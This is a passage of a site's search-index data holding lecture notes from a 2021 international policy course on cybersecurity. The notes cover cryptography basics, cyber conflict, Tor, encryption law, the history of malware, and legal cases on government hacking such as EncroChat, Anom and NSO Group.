a cryptosystem Cryptotext: the encrypted output of a cryptosystem Goals of cryptosystems:\nConfidentiality: keeping information private or secret Integrity: ensuring that information has not been modified Authentication: proving somebody is who they say they are Non-repudiation: proving that a message was sent by a specific actor Modern cryptography definitions # Key primitives # Key exchange: allows you to agree on a secret number Symmetric cipher: encrypts data using a shared key Block cipher: input fixed message size (for DES, 64 bits) Stream cipher: encrypts data one bit at a time Asymmetric cipher: encrypts/decrypts data with different keys Diffie-Hellman (DH): generate shared key from individual public/private keys Rivest-Shamir-Adleman (RSA): encrypt message using public key/private key Hash algorithm: generates a fingerprint for data Function that creates a \u0026ldquo;fingerprint\u0026rdquo; of an arbitrary input that is deterministic, fixed length, and very difficult to reverse Digital signature: proves that data was sent by holder of private key Building blocks of modern cryptography # Digital signatures: proof of identity of users/server Key exchange protocol: share secret key between users/user and server Symmetric cipher: use the secret key to encrypt/decrypt messages Hashes and signatures: make sure the message hasn\u0026rsquo;t been tampered with Uses of encryption # Transport encryption: create a secure tunnel (e.g., HTTPS) TLS - Transport Layer Security Message encryption: protect messages End-to-End encryption: used in iMessage, WhatsApp, Signal At-rest encryption: encrypt data while it\u0026rsquo;s being stored Keys can be stored in hardware "},{"id":170,"href":"/notes/intlpol268/2021-11-03-cyber-conflict/","title":"Cyber Conflict","section":"INTLPOL 268, Fall 2021","content":" Cyber conflict # Nation-state-level hacking # Motivations # Financial gain (IP theft, economic development) Information collection (espionage) Covert action (information operations, sabotage) Armed conflict (if there is one already, or to start one) \u0026ldquo;Prepare the battlefield\u0026rdquo; - gain access to targeted system now to take action on it later \u0026ldquo;Hold at risk\u0026rdquo; - deterrence measures; let other side know you can damage their asset Retaliation options # Ignore it Make threatening noises, but don\u0026rsquo;t do anything (i.e., send ships to the area) Indict individual state-affiliated hackers ex: APT 38 (NK), APT 40 (CN), Sandworm (RU) Restrict exports to foreign entities involved in hack Makes it harder for foreign countries to attract investment Sanctions (e.g., Biden\u0026rsquo;s Russia sanctions in April 2021) Economic sanctions: impede economic growth Freeze individual assets, add travel restrictions Cut off business to entities Diplomatic sanctions Kick out individual diplomats: Russian diplomats expelled in 2018 and 2021 Close an entire embassy/consulate: China consulate closure (Houston, 2020); Russia consulate closures (San Francisco, 2017; Seattle, 2018) Cyber counterstrike Computer Network Operations # Computer Network Defense (CND) Includes actions taken via computer networks to protect, monitor, analyze, detect and respond to network attacks, intrusions, disruptions, or unauthorized actions that would compromise or cripple defense information systems and networks Computer Network Explotation (CNE) Includes enabling actions and intelligence collection via computer networks that exploit data gathered from target Computer Network Attack (CNA) Threat reduction strategies # Defense: minimize harm you would suffer if undesriable action occurs by maximizing relevant defenses and establishing resiliency Deterrence: Convince them not to take undesirable action by maximizing their expected costs and minimizing their expected benefits Disruption: Prevent the other state from becoming capable of taking the undesirable action, or if it has capability already, destroy or degrade it US cyber agencies and policies # Cybersecurity and Infrastructure Security Agency # Since 2018, CISA has been a standalone agency under DHS oversight In charge of physical and cyber security of federal networks and critical infrastructure Protecting civilian federal agencies: ordering federal agencies to fix known exploited vulns Expanding role of collaboration with private sector to increase security of critical networks Conducts vuln assessments, provides tools and training, provides info on emerging threats and hazards so appropriate action can be taken Last year, got subpoena power to warn critical infrastructure systems of vulns via their ISPs Cyberspace Solarium Commission report (March 2020) # Bicameral, bipartisan, intergovernmental body created by NDAA 2019 Develops comprehensive strategic approach to defend US in cyberspace Report\u0026rsquo;s overal vision: \u0026ldquo;layered cyber deterrence\u0026rdquo; Less offense-focused, more defense-focused Protective layers to limit adversary options for using cyberspace against US: Shape behavior: work with allies and partners to promote responsible behavior in cyberspace and isolate bad actors via non-military mechanisms Deny benefits: private/public collaboration to secure critical networks and build resilience Impose costs: Build capacity to \u0026ldquo;defend forward\u0026rdquo; and retain US offensive capabilities Goal: change would-be attackers\u0026rsquo; cost-benefit calculus to reduce attack frequency/severity Previously-secret U.S. authorities for cyber operations # National Security Presidential Memorandum (NSPM) 13 (2018) Finally disclosed to Congress in early 2020, since mandated in NDAA 2020 2018 Presidential finding authorized CIA covert cyber operations against CN/RU/IR/NK CIA no longer has to seek review by NSC for covert cyber ops Easier for CIA to damage adversaries\u0026rsquo; critical infrastructure (cut off electricity, for example) Previously off-limits targets (e.g., banks) are now in-bounds Lower evidentiary burden to attack media orgs, charities, religious groups, etc believed to operate on behalf of foreign intelligence services By 2020, CIA already carried out operations, including against Iran Domestic law relevant to cyber conflict # Executive: very active in this area NSPM-13 (2018) Executive order 14024 (2021) Congress: has powers to declare war, regulate, terminate uses of force, and appropriate money Courts: less active in this area, since actions are occurring abroad "},{"id":171,"href":"/notes/intlpol268/2021-11-08-dark-web-and-cryptocurrencies/","title":"Dark Web and Cryptocurrencies","section":"INTLPOL 268, Fall 2021","content":" The Dark Web # Internet routing # The ideal: anarchism; \u0026ldquo;The Net interprets censorship as damage and routes around it\u0026rdquo; In reality: a few centralized providers maintain infrastructure for all internet communications A LOT of traffic flows through the US NSA saw this as an opportunity for surveillance Also: China\u0026rsquo;s censorship is extremely effective! Can do blocking on traffic that leaves Chinese servers A solution has been to use VPNs, though blocking tech has gotten better The Onion Router (TOR) # Web browser that communicates (encrypted) with a series of nodes that forward traffic, eventually to exit node and to unencrypted open internet TOR is in an arms race with the PRC; PRC tries to shut down TOR access .onion services # Traffic encrypted in layers, each node in the network removes a layer of encryption Example: The Silk Road, online drug marketplace This got shut down by the FBI in 2013 "},{"id":172,"href":"/notes/intlpol268/2021-11-10-encryption-and-technical-assistance/","title":"Encryption and Technical Assistance","section":"INTLPOL 268, Fall 2021","content":" Encryption # US Encryption Law, 1970s-1990s # Encryption used to be regulated as a \u0026ldquo;munition\u0026rdquo; \u0026ldquo;Export-grade\u0026rdquo; cryptography forced by federal regulations to be weaker than cryptography for US market Regulations eventually relaxed around 2000 Still export controls for software with cryptographic functionality (but now loosening) Free-speech challenges by CS professors Bernstein v. U.S. DOJ (9th Cir. 1999) Junger v. Daley (6th Cir. 2000) Impact on modern-day web security FREAK attack (export-grade RSA) Logjam attack (export-grade Diffie-Hellman) DROWN attack (export-grade RSA) "},{"id":173,"href":"/notes/intlpol268/2021-11-15-malware/","title":"Malware","section":"INTLPOL 268, Fall 2021","content":" Malware # Definitions # Malware: umbrella term for malicious software\nVirus: a malicious program that infects other program, usually spreading with human assistance Worm: a malicious program that spreads automatically, often without human intervention Trojan Horse: a malicious program that pretends to be something innocuous Rootkit: software that provides an adversary access to a computer in a hidden manner Specifically: control the computer at a system or kernel level RAT (Remote Access Toolkit): a rootkit that is often optimmized for ease-of-use A history of malware # Once upon a time (Commodore 64 era), viruses were carried on a floppy disk Inserting it would cycle colors and display a message At this time, there was no way to make money with malware, so viruses were mostly cute pranks Wipers: early destructive malware Floppy disk, would erase MSDOS disk The Morris Worm: the first fully automated worm Released by Robert Morris Jr., then a graduate student at Cornell (now a professor at MIT) Took out a large chunk of the internet in those days (6000 computers) Had three different payloads (sendmail, finger, rsh, password guessing) For two different architectures (VAX and Sun-3) Modern malware # Modern rootkits (example: TDL4/TDSS) # Installed via affiliates, who might use\nSocial engineering attack Infected download Exploited website Hides in Windows\nMaster Boot Record (MBR) infection Now can infect UEFI machines as well, including those with Secure Boot enabled Bypasses driver signing Makes money as a botnet\nControlled by P2P network Deletes other bots Does not infect in Russia Self-propagating worm (example: Stuxnet) # The most complex malware of its day Used to infect Iranian nuclear refineries Multi-stage lifecycle Initial infection seeded via compromised Farsi websites Movement between machines via net/USB On Siemens control system, local infection of master software Loaded onto PLCs to cause damage Complex, stealthy mechanism for airgap-jumping communication Ransomware (example: Cryptolocker) # Scan internet for vulnerable compters, push malware that encrypts files and demands ransom to decrypt Originally: Cryptolocker in 2013, for Windows XP machines - demanded 2 BTC as payment Mid 2010s: shift away from individuals and towards municipalities May 2019, Baltimore, MD - city government computer systems infected by RobinHood ransomware for 13 BTC (~$100k at the time), attack cost city ~$6mn in damages February 2016, Hollywood Presbyterian Medical Center - hospital had to divert patients and use paper and fax, ultimately paid a 40 BTC (~$17k) fine November 2016, San Francisco MUNI - department had to make MUNI fares free as they scrambled to recover from attack Early 2020s: ransomware targeted towards big businesses and governments May 2021 - Colonial Pipeline infected by DarkSide group, halted all operations and paid $5M ransom immediately The future of malware # Truly self-guided malware on the high end Commodity malware (good enough) available to almost all groups on the low end Consumer malware moving away from lockers to BTC theft Continued growth of individual risk via cheap mobile RATs Lack of skilled analysts and truly capable software means that malware is still a growth industry "},{"id":174,"href":"/notes/intlpol268/2021-11-17-government-hacking/","title":"Government Hacking","section":"INTLPOL 268, Fall 2021","content":" Government Hacking # Specifically: governments hacking individuals for law enforcement purposes\nTools in law enforcement\u0026rsquo;s investigative toolbox (Easy to Hard)\nTraditional evidence-gathering: warrants, ECPA, etc: Evidence is readily available Compelled technical assistance: Make provider repurpose a product feature for law enforcement purposes Government hacking: Using a bug for law enforcement purposes without provider participation Overview # Usual authority: search and seizure warrant (Fed. R. Crim. Pro. 41) Maybe no warrant needed if LE is only collecting IP address, according to multiple courts (have no reasonable expectation of privacy in IP address) State law may compel: Cal ECPA requires LE to get warrant for IP addresses Since Dec. 2016: statute expressly allows remote-hacking warrants Purposes of hacking Discover suspect\u0026rsquo;s locaton and identity (i.e., IP address) Seize evidence stored on computer or phone Collect evidence going forwards Implant software on device that collects info (e.g., keylogger) Disable functionality that may impede evidence-gathering if computer is seized later (e.g. full-disk encryption) Old school: keystroke loggers # Early \u0026ldquo;government hacking\u0026rdquo; case: U.S. v. Scarfo (D. N.J. 2001)\nFBI developed keylogger; details classified for national security purposes FBI got warrant to search Scarfo\u0026rsquo;s office and computer in early 1999 Computer files of interest to FBI were encrypted FBI got court order allowing keylogger on computer keyboard to capture Scarfo\u0026rsquo;s decryption password as he logged in Required physical entry; today keyloggers can be remotely installed Configured not to activate if modem was in use (due to Wiretap Act) More recent: digital forensics tools to access devices # FBI has own in-house hacking R\u0026amp;D units Operational technology division (OTD) Digital Forensics and Analysis Unit Third party vendors of tools that use vulns to extract data off locked phones Cellebrite (Israel): Universal Forensic Extraction Devices (UFED) iOS, Android, BlackBerry Cellebrite\u0026rsquo;s tools and services have had own vulns in the past Grayshift (U.S.): GrayKey devices, iOS only Customers: federal, state, local LE agencies; military Oct. 2020 Upturn report: 2000+ LE agencies in all 50 states have these tools Used for minor crimes as well as serious ones Sharing access: fed/state partnerships (e.g. Regional Computer Forensics Labs) Perennial cat-and-mouse games between vendors and Apple/Google/etc Undermines LE arguments for mandatory encryption backdoors for devices Shift from \u0026ldquo;can\u0026rsquo;t get into encrpyted phones at all\u0026rdquo; to \u0026ldquo;can\u0026rsquo;t get in quickly\u0026rdquo; Hacking computers remotely # In-house Hacking R\u0026amp;D: # Intelligence NSA: Tailored Access Operations (now called Computer Network Operations) CIA: hacking devision within Center for Cyber Intelligence (CCI) Law enforcement FBI -\u0026gt; OTD -\u0026gt; Technical Surveillance Section -\u0026gt; Remote Operations Unit (most information about this is classified) Old school: CIPAV (Computer and Internet Protocol Address Verifier) # FBI-developed tool, used at minimum 2004-2007 FBI obtained search warrants authorizing use of CIPAV where targets used anonmyizing services to hide ID and location Deployed by sending phishing messages to specific targets CIPAV collected computer\u0026rsquo;s true IP address, MAC address, logged-in user name, last URL visited, other metadata Transmitted data back to FBI via internet More recent: EncroChat # Secure phone companies sell to both paranoid people and crime rings Encrypted device (typically modified Android handset), encrypted video/voice/text/email, extra security features, etc Examples: Blackphone (created by PGP co-founders), Phantom Secure (started legit but founder now in prison, refused FBI request to install backdoor), MPC (run directly by organized criminals), Ciphr (popular with criminals, allegedly has stopped operating in US and AU) EncroChat: secure phone of choice for much of Europe\u0026rsquo;s drug trafficking and organized crime 3-year joint French and Dutch sting operation culminating in June 2020 French authorities took over an EncroChat server housed in France French/Dutch authorities used the compromised server to deploy malicious update to all devices Could thus record users\u0026rsquo; lockscreen passcodes, identify wifi hotspots near the devices (and thus location), and MITM traffic passing over the EncroChat network (\u0026gt;100M messages) French/Dutch team shared data with other countries: 800+ arrests in 5+ countries Was this mass hacking operation legal? French relied on law allowing use of surveillance tools without consent In requesting data, UK authorities claimed most/all users were criminals and there were no legit uses for the phone UK challenge failed in English high court, challenge in FR supreme court pending after failing in appeals court, other legal challenges in DE, NL, SE Anom (Operation Trojan Shield) # Arose from ashes of Phantom Secure (shut down 2018), operation ran from March 2018 to June 2021 FBI cultivated former Phantom Secure reseller (CHS) to develop new \u0026ldquo;secure\u0026rdquo; phone and resell to criminals FBI + AU federal police (AFP) worked with CHS to code a system where messages could be read by AFP Anom built up a marketing profile, leveraged CHS\u0026rsquo;s networks to gain trust of phone resellers and criminal clients; AFP did a test run of ~50 devices, sales grew by word of mouth to ~12K devices in 9o0 countries; FBI and AFP allege that 100% of users were using devices for criminal purposes 20M+ messages intercepted, AFP and unknown third country shared users\u0026rsquo; communications with FBI FBI spied on non-US persons, laundered its spying on US persons via other countries\u0026rsquo; surveillance laws FBI excluded US devices via geo-fencing, so FBI didn\u0026rsquo;t access any US-based comms For devices in US (only ~15 out of 100s), AFP monitored comms instead For non-US fones, encrpyted \u0026ldquo;bcc\u0026rdquo; of each message was routed to server outside US, then decrypted, then re-encrypted with FBI key, passed to FBI-owned server, then decrypted and ready to view Lengthy negotiations about legal framework between FBI and third country - third country got court order under its law to copy an Anom server there and provde periodic copies to FBI 2-3x/week under MLAT, without reviewing content itself FBI\u0026rsquo;s near term goal: infiltrate criminal networks; larger goal: shake confidence in \u0026ldquo;secure\u0026rdquo; phone industry NSO Group # Private-sector vendor, like Cellebrite and Grayshift Provides remote-hacking software to governments, tech support, training NSO claims only used for LE and CT purposes But Pegasus software is used to hack activists, dissidents, journalists, etc Summer 2021 report: leaked list of potential targets, 50k+ phone numbers Nov. 2021: added to Commerce Dept. Entity List due to enabling these abuses Related: new Commerce Dept. rule effective Dec. 2021, barring selling hacking tech to RU/CN/etc (pursuant to Wassenaar Arrangement) In Oct. 2019, Facebook sued NSO over WhatsApp hack NSO allegedly built and sold a hacking platform that exploted a flaw in WhatsApp servers to help clients hack WA users\u0026rsquo; phones NSO created WA user accounts, used them to send malicious code to target devices - \u0026ldquo;zero-click attack\u0026rdquo; Novel CFAA theory: Hacking WA users = CFAA violation against WhatsApp NSO hacking tool was used to hack users but using WA equipment Users could have sued for CFAA violations on their own behalf, too At least 1400 WA users were affected and notified (including 100+ journalists, human rights activists, lawyers, etc) WA checked for LE demands first before notifying them (to mitigate investigatory impact) Jul. 2020: District court denied NSO motion to dismiss CFAA claim Accounts had rights to access parts of WA (no \u0026ldquo;without authorization\u0026rdquo;) But NSO\u0026rsquo;s code used WA\u0026rsquo;s relay servers without authorization and evaded technical restrictions on access to \u0026ldquo;signaling servers\u0026rdquo; (\u0026ldquo;exceeds authorized access\u0026rdquo;) District court rejected NSO\u0026rsquo;s \u0026ldquo;derivative foreign soverign immunity\u0026rdquo; theory Doctrine does not apply to foreign contractors of foreign sovereigns Nov. 2021: Ninth Circuit upheld that rejection, denied NSO appeal Case now goes back to district court unless SCOTUS to take it Compare to Kidane v. Ethiopia (D.C. Cir. 2017) Ethiopian-born US citizen living in US, hacked by Ethiopia with FinSpy software Lawsuit barred by FSIA because hacking conducted of Ethiopia, FSIA requires all elements of wrongdoing to occur within the US Attempts to use hacking tools by LEAs # DEA: has bought or considered buying surveillance tools from controversial companies Discussions with NSO group in 2014, decided NSO tools were too expensive Bought tools from reseller of Italian surveillance-tech firm Hacking Team in 2012-2015 FBI: pose as journalist strategy was used by Iranian govt hackers in 2019-2020 Impersonated journalists -\u0026gt; gained targets\u0026rsquo; trust -\u0026gt; sent them infected files, phishing links Targets: academics, human rights, journalists When repressive governments use same tools as US, harder for us to condemn it\nIncreased inter-departmental cooperation on hacking (DHS, ICE, Secret Service) DOJ: has given PPT trainings on the use of NITs to staff at federal agencies IRS and ICE: possible users IRS may be using exploits in Adobe software to deliver malware ICE, Secret Service have been emailing about govt use of malware Secret Service 2018: internal discussions of legality and practicality of using hacking tools Late 2016/early 2017: Seattle PD officer, while detailed to a SS task force, unsucessfully tried to use an NIT to unmask a Tor-using ransomware attacker Govt use of hacking tools continues to expand, need oversight/transparency/regulation\n"},{"id":175,"href":"/notes/intlpol268/2021-11-29-new-frontiers/","title":"New Frontiers","section":"INTLPOL 268, Fall 2021","content":" New Frontiers # China # 5 of the largest Internet platforms are Chinese TikTok: first to become dominant globally without Chinese government help PRC-based companies: Have to deal with political content moderation requirements Less experienced with safety issues as Western companies are Are not experienced with Western privacy laws Might store data in the PRC Could decide to not follow ECPA Crackdown on PRC-based tech CEOs that publicly disagree with CCP policies or that present a threat to Xi Jinping\u0026rsquo;s power Synthetic Media # Example: DNC email hack in 2016 Can create fake Facebook/Twitter profiles to mislead Types of abuse where falsity isn\u0026rsquo;t relevant to impact: Fake accounts Sextortion Harassment Spam Hate speech NCII These are ripe grounds for deepfakes IOT # Everything is a computer! (@internetofshit on Twitter) Computers are easy to hack, especially given trickle-down of attacks from state actors when they are released Combination of the two is very dangerous - lots of potential for spying or other harassment State and financial attacks on individuals # Just two days ago (11/27/2021): NYT article on Iran-Israel hacking of gas IT and dating apps Cryptocurrency scams and hacking, etc Security is only the tip of the harm iceberg # Alternatively: Stamos\u0026rsquo;s hierarchy of bad stuff that happens on the internet\nBiggest issue: abuse (technically legal use of a platform to cause harm) Infosec: only 20% of the iceberg Account lifecycle/passwords (large majority) Corporate patching (attacks from security updates not being applied) Config errors Old app vulns Tip of this iceberg: new research Tip of this iceberg: 0-day Even smaller: side-channel attacks "}]